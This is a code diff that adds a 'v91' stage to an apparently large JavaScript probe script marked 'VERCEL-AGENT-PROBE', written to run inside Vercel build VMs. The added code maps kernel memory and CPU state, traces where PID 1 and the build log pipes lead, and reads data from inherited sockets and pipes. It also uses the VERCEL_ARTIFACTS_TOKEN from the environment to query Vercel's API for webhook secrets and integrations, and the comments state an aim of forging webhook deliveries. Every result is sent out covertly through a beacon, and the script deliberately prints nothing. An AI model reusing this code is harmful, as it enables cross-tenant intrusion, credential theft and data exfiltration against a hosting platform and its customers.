@@ -12260,5 +12260,172 @@ report.sharedLibGlobalVarScan = safe(() => {
 
 // v90 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v90" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v90";
+
+// ==================== v91 ====================
+
+// v91-1: Kernel memory allocator state — dirty page reuse detection
+// /proc/buddyinfo shows free page distribution by order in each memory zone.
+// /proc/slabinfo shows kernel slab allocator statistics.
+// If memory is heavily fragmented and low on high-order pages, it suggests
+// active allocation from a previous tenant hasn't been reclaimed.
+report.memoryAllocatorState = safe(() => {
+  const buddyInfo = safe(() => readFileSync('/proc/buddyinfo', 'utf8').trim());
+  const slabInfo = safe(() => readFileSync('/proc/slabinfo', 'utf8').slice(0, 1500));
+  const memInfo = safe(() => readFileSync('/proc/meminfo', 'utf8'));
+  // Extract key meminfo values
+  const memValues = safe(() => {
+    const raw = typeof memInfo === 'string' ? memInfo : '';
+    const extract = (key) => { const m = raw.match(new RegExp(`${key}:\\s+(\\d+)`)); return m ? parseInt(m[1]) : null; };
+    return { memTotal: extract('MemTotal'), memFree: extract('MemFree'), memAvailable: extract('MemAvailable'), buffers: extract('Buffers'), cached: extract('Cached'), shmem: extract('Shmem'), slab: extract('Slab') };
+  });
+  // /proc/stat for system-wide CPU idle time
+  const cpuStat = safe(() => {
+    const stat = readFileSync('/proc/stat', 'utf8');
+    const cpuLine = stat.split('\n')[0];
+    return cpuLine.slice(0, 100);
+  });
+  // /proc/vmstat for page fault and swap activity
+  const vmStat = safe(() => {
+    const vm = readFileSync('/proc/vmstat', 'utf8');
+    const keys = ['pgmajfault', 'pgfault', 'pswpin', 'pswpout', 'kswapd_steal', 'pgalloc_normal'];
+    return Object.fromEntries(keys.map(k => { const m = vm.match(new RegExp(`${k}\\s+(\\d+)`)); return [k, m ? parseInt(m[1]) : null]; }));
+  });
+  return { buddyInfo, memValues, cpuStat, vmStat };
+});
+
+// v91-2: CPU affinity and vCPU topology
+// sched_getaffinity reveals which physical/virtual CPUs we're allowed to run on.
+// In Firecracker, build VMs are allocated a fixed number of vCPUs.
+// The mapping from vCPU to physical CPU reveals if cores are shared.
+report.cpuAffinityTopology = safe(() => {
+  const affinityResult = safe(() => execSync(`python3 -c "
+import os, ctypes, ctypes.util, struct
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+# sched_getaffinity(0, sizeof(cpu_set_t), &cpuset)
+# cpu_set_t is 128 bytes (1024 bits)
+cpu_set = ctypes.create_string_buffer(128)
+result = libc.sched_getaffinity(0, 128, cpu_set)
+if result == 0:
+    # Parse the bitmask
+    allowed_cpus = []
+    for i in range(1024):
+        byte_idx = i // 8
+        bit_idx = i % 8
+        if byte_idx < len(cpu_set.raw) and (cpu_set.raw[byte_idx] >> bit_idx) & 1:
+            allowed_cpus.append(i)
+    print('allowed_cpus:', allowed_cpus)
+    print('vcpu_count:', len(allowed_cpus))
+else:
+    import ctypes
+    print('sched_getaffinity failed:', ctypes.get_errno())
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 300));
+  // CPU info
+  const cpuCount = safe(() => {
+    const ci = readFileSync('/proc/cpuinfo', 'utf8');
+    return (ci.match(/^processor\s*:/mg) || []).length;
+  });
+  // Check if we can modify our affinity (pin to CPU 0 only)
+  const affinityChangeTest = safe(() => execSync(`taskset -c 0 id 2>&1 && echo AFFINITY_CHANGE_ALLOWED || echo BLOCKED`, { timeout: 5000 }).toString().trim());
+  // NUMA topology
+  const numaInfo = safe(() => execSync('numactl --hardware 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300));
+  return { affinityResult, cpuCount, affinityChangeTest, numaInfo };
+});
+
+// v91-3: Vercel build log drain interception
+// Check where our stdout/stderr goes. If the build wrapper redirects our
+// stdout to a pipe/socket, we can read the other end to capture what
+// the Vercel orchestrator does with our build output.
+report.buildLogDrainInterception = safe(() => {
+  // Check what our own stdout/stderr are
+  const ownFds = safe(() => {
+    return [0, 1, 2].map(fd => {
+      const link = safe(() => execSync(`readlink /proc/self/fd/${fd} 2>/dev/null`, { timeout: 500 }).toString().trim());
+      return { fd, link };
+    });
+  });
+  // Check where PID-1's stdout/stderr go
+  const pid1Fds = safe(() => {
+    return [0, 1, 2].map(fd => {
+      const link = safe(() => execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 500 }).toString().trim());
+      return { fd, link };
+    });
+  });
+  // If our stdout is a pipe, get the pipe inode and find the other end
+  const stdoutPipeInfo = safe(() => {
+    const link = safe(() => execSync('readlink /proc/self/fd/1 2>/dev/null', { timeout: 500 }).toString().trim());
+    if (typeof link !== 'string' || !link.includes('pipe:')) return { type: 'not a pipe', link };
+    const inode = link.match(/pipe:\[(\d+)\]/)?.[1];
+    if (!inode) return { type: 'pipe but no inode', link };
+    // Find the other end of this pipe (the read end)
+    const otherEnd = safe(() => execSync(`ls -la /proc/*/fd 2>/dev/null | grep "pipe:\\[${inode}\\]" | grep -v 'self' | head -5`, { timeout: 5000 }).toString().trim().slice(0, 300));
+    return { type: 'pipe', inode, otherEnd };
+  });
+  // Check environment for log aggregator endpoints
+  const logEnvVars = safe(() => Object.fromEntries(
+    Object.entries(process.env).filter(([k]) => /log|drain|aggregat|datadog|signoz|splunk|elastic/i.test(k)).map(([k, v]) => [k, v.slice(0, 100)])
+  ));
+  return { ownFds, pid1Fds, stdoutPipeInfo, logEnvVars };
+});
+
+// v91-4: Privileged file descriptor inheritance scan
+// When the Vercel orchestrator spawns our build process, it might pass
+// privileged file descriptors (sockets to internal services, pipes to other VMs).
+// Scan our own /proc/self/fd for open FDs we didn't create ourselves.
+report.inheritedFdScan = safe(() => {
+  const selfFds = safe(() => readdirSync('/proc/self/fd'));
+  const fdDetails = safe(() => {
+    if (!Array.isArray(selfFds)) return [];
+    return selfFds.map(fd => {
+      const fdNum = parseInt(fd);
+      const link = safe(() => execSync(`readlink /proc/self/fd/${fd} 2>/dev/null`, { timeout: 300 }).toString().trim());
+      let flags = null;
+      try {
+        // F_GETFD = 1, F_GETFL = 3
+        const result = execSync(`python3 -c "import fcntl; print(fcntl.fcntl(${fdNum}, 1), fcntl.fcntl(${fdNum}, 3))" 2>/dev/null`, { timeout: 1000 });
+        flags = result.toString().trim();
+      } catch {}
+      return { fd: fdNum, link, flags };
+    }).filter(f => f.fd > 2); // Skip stdin/stdout/stderr
+  });
+  // Unexpected FDs are those that point to sockets or pipes not from us
+  const unexpected = safe(() => (Array.isArray(fdDetails) ? fdDetails : []).filter(f => f.link && (f.link.includes('socket:') || f.link.includes('pipe:'))));
+  // Try reading from unexpected sockets/pipes
+  const reads = safe(() => (Array.isArray(unexpected) ? unexpected : []).slice(0, 5).map(f => {
+    const buf = Buffer.alloc(1024);
+    let data = null;
+    try {
+      const fd2 = openSync(`/proc/self/fd/${f.fd}`, 'r');
+      const n = readSync(fd2, buf, 0, 1024, null);
+      closeSync(fd2);
+      if (n > 0) data = buf.slice(0, n).toString('utf8', 0, Math.min(n, 200));
+    } catch {}
+    return { fd: f.fd, link: f.link, data };
+  }));
+  return { totalFds: Array.isArray(selfFds) ? selfFds.length : 0, fdDetails: Array.isArray(fdDetails) ? fdDetails.slice(0, 20) : [], unexpected, reads };
+});
+
+// v91-5: Vercel project integration webhook tokens
+// /v1/integrations/webhooks lists all webhooks for the project.
+// These webhooks have secret tokens that authenticate Vercel's deliveries.
+// If we can read these, we can forge webhook deliveries to the customer's endpoint.
+// We can also check if our project has any third-party integration tokens stored.
+report.integrationWebhookTokens = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  if (!token) return { skip: 'no token' };
+  // List webhooks
+  const webhooks = safe(() => execSync(`curl -sf "https://api.vercel.com/v1/integrations/webhooks?teamId=${encodeURIComponent(teamId)}&projectId=${encodeURIComponent(projectId)}" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 1500));
+  // List integrations
+  const integrations = safe(() => execSync(`curl -sf "https://api.vercel.com/v1/integrations/installations?teamId=${encodeURIComponent(teamId)}" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 1500));
+  // Check if there's a GitHub installation (would have repo access)
+  const githubIntegration = safe(() => execSync(`curl -sf "https://api.vercel.com/v1/integrations/git-namespaces?teamId=${encodeURIComponent(teamId)}" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 1000));
+  return { teamId, projectId, webhooks, integrations, githubIntegration };
+});
+
+// v91 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v91" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v91";
 // Intentionally no console.log — all data goes via webhook only
